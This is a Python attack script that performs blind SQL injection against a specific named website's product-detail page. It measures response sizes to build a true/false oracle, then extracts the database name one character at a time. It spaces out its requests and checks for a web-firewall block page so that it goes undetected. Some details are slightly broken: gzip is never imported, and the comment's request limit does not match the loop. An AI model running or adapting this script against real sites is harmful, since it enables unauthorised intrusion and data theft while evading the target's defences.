#!/usr/bin/env python3
"""yijingweb: extract ONE db char per run (8 requests max, under wangdun window)
Oracle: id=686' && (expr)--  true/false size diff (calibrate each run)
"""
import urllib.request, urllib.parse, string, time, sys

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "zh-CN,zh;q=0.9", "Accept-Encoding": "identity", "Connection": "keep-alive"}
BASE = "http://www.yijingweb.com/webmall/detail.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        body = r.read()
        if r.headers.get("Content-Encoding") == "gzip":
            try: body = gzip.decompress(body)
            except Exception: pass
        blocked = b"\xe4\xba\x91\xe7\xbd\x91\xe7\x9b\xbe" in body
        return r.status, len(body), blocked
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000)), False
    except Exception:
        return 0, 0, False

def get_sz(payload):
    return fetch(BASE + "?id=686" + payload)

# 1. calibrate (2 true + 2 false = 4 requests)
t_vals, f_vals = [], []
for _ in range(2):
    c, s, b = get_sz("%27%20%26%26%20(select%201)=1--%20")
    if b: print("BLOCKED calib-true"); sys.exit(1)
    t_vals.append(s)
    time.sleep(3)
    c, s, b = get_sz("%27%20%26%26%20(select%201)=2--%20")
    if b: print("BLOCKED calib-false"); sys.exit(1)
    f_vals.append(s)
    time.sleep(3)
t = sum(t_vals)//len(t_vals)
f = sum(f_vals)//len(f_vals)
print("true=%s avg=%d false=%s avg=%d diff=%d" % (t_vals, t, f_vals, f, t - f), flush=True)
if abs(t - f) < 15:
    print("ORACLE WEAK - abort"); sys.exit(1)
threshold = (t + f) / 2

# 2. extract ONE char (max 4 tests = 4 requests, total 8)
POS = int(sys.argv[1]) if len(sys.argv) > 1 else 1
for c in CHARS:
    expr = "select substr(database(),%d,1)='%s'" % (POS, c)
    payload = "%27%20%26%26%20(" + urllib.parse.quote(expr) + ")--%20"
    cc, s, b = get_sz(payload)
    time.sleep(3)
    if b:
        print("BLOCKED mid-extract at %s" % c); sys.exit(1)
    if s > threshold:
        print("POS%d=%s (size=%d)" % (POS, c, s), flush=True)
        sys.exit(0)
print("POS%d=?" % POS, flush=True)
